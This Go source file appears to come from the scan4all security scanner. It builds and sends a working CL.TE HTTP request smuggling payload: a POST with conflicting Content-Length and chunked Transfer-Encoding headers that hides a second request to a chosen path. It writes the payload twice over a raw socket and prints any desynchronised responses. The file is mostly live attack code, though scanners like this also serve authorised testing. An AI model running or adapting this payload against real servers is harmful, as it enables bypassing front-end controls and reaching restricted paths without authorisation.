package main

import (
	"fmt"
	"github.com/GhostTroops/scan4all/lib/Smuggling"
	"github.com/GhostTroops/scan4all/lib/socket"
	"github.com/GhostTroops/scan4all/lib/util"
	"net/url"
	"strings"
	"sync"
)

type CLTE struct {
	SzUrl   string
	UrlObj  *url.URL
	Payload []string
}

func n2rn(s string) string {
	return strings.ReplaceAll(s, "\n", "\r\n")
}
func slen(s string) int {
	return len([]byte(s))
}

func NewCLTE(szUrl string) *CLTE {
	var gte = &CLTE{
		SzUrl: szUrl,
		Payload: []string{n2rn(`POST / HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded
Content-Length: %d
Transfer-Encoding: chunked

`), n2rn(`0

POST %s HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: %d%s
Connection: close

search=testnmanp`)},
	}
	oH, err := url.Parse(szUrl)
	if nil == err {
		gte.UrlObj = oH
	}
	return gte
}

// 1、分析得到 Location
// 2、针对 Location 的数据进行目录遍历
func (r *CLTE) DoFirst(szPath, szLocalHost string) {
	pay1 := r.Payload
	s1, s2 := pay1[0], pay1[1]
	if "" != szLocalHost {
		szLocalHost = "\r\nhost: " + szLocalHost
	}
	pay1[1] = fmt.Sprintf(s2, szPath, 200, szLocalHost)
	pay1[0] = fmt.Sprintf(s1, r.UrlObj.Host, slen(pay1[1]))

	xx1 := socket.NewCheckTarget(r.SzUrl, "tcp", 10)
	s1 = strings.Join(pay1, "")
	if _, err := xx1.ConnTarget(); nil == err && xx1.ConnState {
		defer xx1.Close()
		xx1.WriteWithFlush(s1)
		xx1.WriteWithFlush(s1)
		s2 = *xx1.ReadAll2Str()
		a := strings.Split(s2, "HTTP/1.")
		if 3 <= len(a) {
			fmt.Println(r.SzUrl, "\n", s2)
		}
	}
}

func main() {
	a := strings.Split(``, "\n")
	util.Wg = &sync.WaitGroup{}
	for _, x := range a {
		Smuggling.DoCheckSmuggling(x, "")
		//x1 := NewCLTE(x)
		//x1.DoFirst("/svn/", "")
	}
	util.Wg.Wait()
}
